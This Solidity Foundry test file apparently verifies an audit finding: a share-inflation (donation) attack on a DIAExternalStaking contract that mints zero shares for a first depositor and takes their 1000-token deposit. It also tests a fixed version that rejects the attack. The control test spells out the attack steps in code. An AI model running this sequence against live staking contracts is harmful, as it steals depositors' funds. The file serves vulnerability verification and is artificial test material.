// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import {DIAExternalStakingFixed, Exploit, StakeToken, Victim} from "./57914-inflation-attack-in-diaexternalstaking-allows-stealing-first.sol";

contract Finding57914Test is Test {
    function test_donation_mints_zero_shares_and_steals_the_deposit() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.victimShares(), 0, "victim minted 0 shares");
        assertEq(e.stolen(), 1000 ether, "attacker profit is the 1000 deposit");
        assertEq(e.token().balanceOf(address(e.victim())), 0, "victim balance is empty");
    }

    function test_control_rejects_the_zero_share_mint() public {
        StakeToken token = new StakeToken();
        DIAExternalStakingFixed staking = new DIAExternalStakingFixed(token, 1_000_000 ether);
        Victim victim = new Victim();
        token.mint(address(this), 1001 ether);
        token.mint(address(victim), 1000 ether);
        token.approve(address(staking), type(uint256).max);
        uint256 index = staking.stake(1 ether);
        staking.requestUnstake(index);
        staking.unstake(index, 1 ether - 1);
        staking.addRewardToPool(1000 ether);
        (bool ok,) = address(victim).call(abi.encodeWithSelector(victim.deposit.selector, token, staking, 1000 ether));
        assertFalse(ok, "zero-share stake reverts");
        assertEq(token.balanceOf(address(victim)), 1000 ether, "victim keeps 1000");
    }
}
